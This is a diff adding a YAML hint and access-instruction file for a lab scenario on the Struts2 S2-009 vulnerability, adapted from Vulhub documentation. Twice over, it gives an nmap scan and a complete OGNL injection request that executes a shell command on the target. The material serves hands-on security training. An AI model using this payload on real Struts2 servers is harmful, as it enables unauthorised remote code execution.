@@ -1,0 +1,166 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: struts2/s2-009
+hint_levels:
+  low:
+  - Inspect the struts2 service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080/ajax/example5.action`.'
+  high:
+  - 'Vulnerability: S2-009 Remote Code Execution Vulnerablity.'
+  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
+    substitutions.
+  - |-
+    Exploit
+
+    The environment is a struts2 "feature display" website named `Struts Showcase`. We need find an action that accepts the parameter, and type is string.
+
+    First decompress `S2-009.war`. We can see that source code is in the `WEB-INF/src` directory, I generally look for ajax related code.
+
+    Found one in`WEB-INF/src/java/org/apache/struts2/showcase/ajax/Example5Action.java`:
+
+    ```java
+    public class Example5Action extends ActionSupport {
+
+        private static final long serialVersionUID = 2111967621952300611L;
+
+        private String name;
+        private Integer age;
+
+
+        public String getName() { return name; }
+        public void setName(String name) { this.name = name; }
+
+        public Integer getAge() { return age; }
+        public void setAge(Integer age) { this.age = age; }
+
+        @Override
+        public String execute() throws Exception {
+            return SUCCESS;
+        }
+    }
+    ```
+
+    The code is simple, it accepts the name parameter and calls setName to assign it to the private property `this.name`, which is in line with our requirement. Then we go to `WEB-INF/src/java/struts-ajax.xml` to see the URL routing setting:
+
+    ```xml
+    <package name="ajax" extends="struts-default">
+        ...
+        <action name="example5" class="org.apache.struts2.showcase.ajax.Example5Action">
+            <result name="input">/ajax/tabbedpanel/example5.jsp</result>
+            <result>/ajax/tabbedpanel/example5Ok.jsp</result>
+        </action>
+        ...
+    </package>
+    ```
+
+    We can see `name=example5`, so access the controller by visiting `http://{{NODE_IP}}:8080/ajax/example5.action`. Then put the OGNL exploit code in the name parameter and access the URL:
+
+    ```
+    GET /ajax/example5?age=12313&name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&z[%28name%29%28%27meh%27%29]=true HTTP/1.1
+    Host: {{NODE_IP}}:8080
+    Accept: */*
+    Accept-Language: en
+    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+    Connection: close
+
+
+    ```
+
+    The POC don't have display, so we use `touch /tmp/success` command, and we found that the `success` file has been created to prove that expliot succeeded.
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-009/1.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-009/README.md'
+  - |-
+    Additional public references:
+    - http://struts.apache.org/docs/s2-009.html
+access_instructions:
+  title: S2-009 Remote Code Execution Vulnerablity
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080/ajax/example5.action`.
+  - title: Exploit
+    instructions: |-
+      The environment is a struts2 "feature display" website named `Struts Showcase`. We need find an action that accepts the parameter, and type is string.
+
+      First decompress `S2-009.war`. We can see that source code is in the `WEB-INF/src` directory, I generally look for ajax related code.
+
+      Found one in`WEB-INF/src/java/org/apache/struts2/showcase/ajax/Example5Action.java`:
+
+      ```java
+      public class Example5Action extends ActionSupport {
+
+          private static final long serialVersionUID = 2111967621952300611L;
+
+          private String name;
+          private Integer age;
+
+
+          public String getName() { return name; }
+          public void setName(String name) { this.name = name; }
+
+          public Integer getAge() { return age; }
+          public void setAge(Integer age) { this.age = age; }
+
+          @Override
+          public String execute() throws Exception {
+              return SUCCESS;
+          }
+      }
+      ```
+
+      The code is simple, it accepts the name parameter and calls setName to assign it to the private property `this.name`, which is in line with our requirement. Then we go to `WEB-INF/src/java/struts-ajax.xml` to see the URL routing setting:
+
+      ```xml
+      <package name="ajax" extends="struts-default">
+          ...
+          <action name="example5" class="org.apache.struts2.showcase.ajax.Example5Action">
+              <result name="input">/ajax/tabbedpanel/example5.jsp</result>
+              <result>/ajax/tabbedpanel/example5Ok.jsp</result>
+          </action>
+          ...
+      </package>
+      ```
+
+      We can see `name=example5`, so access the controller by visiting `http://{{NODE_IP}}:8080/ajax/example5.action`. Then put the OGNL exploit code in the name parameter and access the URL:
+
+      ```
+      GET /ajax/example5?age=12313&name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&z[%28name%29%28%27meh%27%29]=true HTTP/1.1
+      Host: {{NODE_IP}}:8080
+      Accept: */*
+      Accept-Language: en
+      User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+      Connection: close
+
+
+      ```
+
+      The POC don't have display, so we use `touch /tmp/success` command, and we found that the `success` file has been created to prove that expliot succeeded.
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-009/1.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-009/README.md
+  readme_sha256: fa10a9097ca14c1ac77d256332330c7beacce07a6e830a67b7cc3b04974088f9
+  compose_sha256: 6b829d3db6d54ade90e428bb8834db9e521fa5e88a94b32b1e42306b14c97ec3
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
